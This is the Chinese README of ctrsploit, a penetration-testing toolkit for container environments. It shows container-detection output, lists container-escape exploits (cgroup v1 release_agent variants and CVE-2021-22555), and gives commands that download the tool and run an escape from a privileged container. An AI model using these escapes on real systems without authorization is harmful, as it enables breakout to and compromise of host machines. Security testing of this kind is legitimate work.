# ctrsploit: 一个容器场景自动化渗透测试工具

[English Version](./README.md)

## Pre-Built Release

https://github.com/ssst0n3/ctrsploit/releases

## Usage

### Quick-Start

### 信息收集

usage

```
root@ctr:/# ./ctrsploit env
NAME:
   ctrsploit env - gather information

USAGE:
   ctrsploit env command [command options] [arguments...]

COMMANDS:
   where, w        detect whether you are in the container, and which type of the container
   graphdriver, g  detect graphdriver type and extend information
   cgroups, c      gather cgroup information
   help, h         Shows a list of commands or help for one command

OPTIONS:
   --help, -h  show help (default: false)
```

查看当前是否在容器内，在何容器内：

```
root@ctr:/# ./ctrsploit  env  w
INFO[0000] ===========Docker=========
.dockerenv exists: ✔
rootfs contains 'docker': ✔
cgroup contains 'docker': ✘
the mount source of /etc/hosts contains 'docker': ✔
hostname match regex ^[0-9a-f]{12}$: ✔
=> is in docker: ✔
INFO[0000] ===========k8s=========
/var/run/secrets/kubernetes.io exists: ✘
hostname match k8s pattern: ✘
the mount source of /etc/hosts contains 'pods': ✘
cgroup contains 'kubepods': ✘
=> is in k8s: ✘ 
```

### run a exploit

```
root@2aa13a052102:/# ./ctrsploit e
NAME:
   ctrsploit exploit - run a exploit

USAGE:
   ctrsploit exploit command [command options] [arguments...]

COMMANDS:
   cgroupv1-release_agent, ra                       escape tech by using the notify_on_release of cgroup v1
   cgroupv1-release_agent-unknown_rootfs, ra3       escape tech by using the notify_on_release of cgroup v1 without known rootfs
   help, h                                          Shows a list of commands or help for one command

OPTIONS:
   --help, -h  show help (default: false)

```

例如: 使用'cgroupv1-release_agent'技术逃逸:

```
root@host # docker run -ti --rm --security-opt="apparmor=unconfined" --cap-add="sys_admin" busybox
root@ctr # wget -O ctrsploit https://github.com/ssst0n3/ctrsploit/releases/download/v0.4/ctrsploit_linux_amd64 && chmod +x ctrsploit
root@ctr # ./ctrsploit e ra -c "cat /etc/hostname"
```

## Details

### env

| command | alias | description |
| --- | --- | --- |
| [where](./env/where/README.md) | w | detect whether you are in the container, and which type of the container |
| [graphdriver](./env/graphdriver/README.md) | g | detect graphdriver type and extend information |
| [cgroups](./env/cgroups/README.md) | c | gather cgroup information |
| [capability](./env/capability/README.md) | cap | show the capability of pid 1 and current process |
| seccomp | s | show the seccomp info |
| apparmor | a | show the apparmor info |

### exploit

| exploit | 缩写 | 简述 |
| --- | --- | --- |
| [cgroupv1-release_agent](./exploit/cgroupv1-release_agent/README.md) | ra | escape tech by using the notify_on_release of cgroup v1 |
| [cgroupv1-release_agent-unknown_rootfs](./exploit/cgroupv1-release_agent-unknown_rootfs/README.md) | ra3 | escape tech by using the notify_on_release of cgroup v1 without known rootfs |
| [cve-2021-22555](./exploit/CVE-2021-22555/README.md) | 22555 | escape tech by using the CVE-2021-22555 |

### Help

```
wget -O ctrsploit https://github.com/ssst0n3/ctrsploit/releases/download/v0.4/ctrsploit_linux_amd64 && chmod +x ctrsploit
./ctrsploit --help
NAME:
   ctrsploit - A penetration toolkit for container environment

ctrsploit is a command line ... //TODO


USAGE:
   ctrsploit [global options] command [command options] [arguments...]

COMMANDS:
   auto, a     auto gathering information, and detect vuls, and exploit // TODO
   exploit, e  run a exploit
   env, e      gather information // TODO
   help, h     Shows a list of commands or help for one command

GLOBAL OPTIONS:
   --lang value  language for the greeting (default: "english")
   --help, -h    show help (default: false)
```

## Todo List

参见 [FEATURES.md](./FEATURES.md)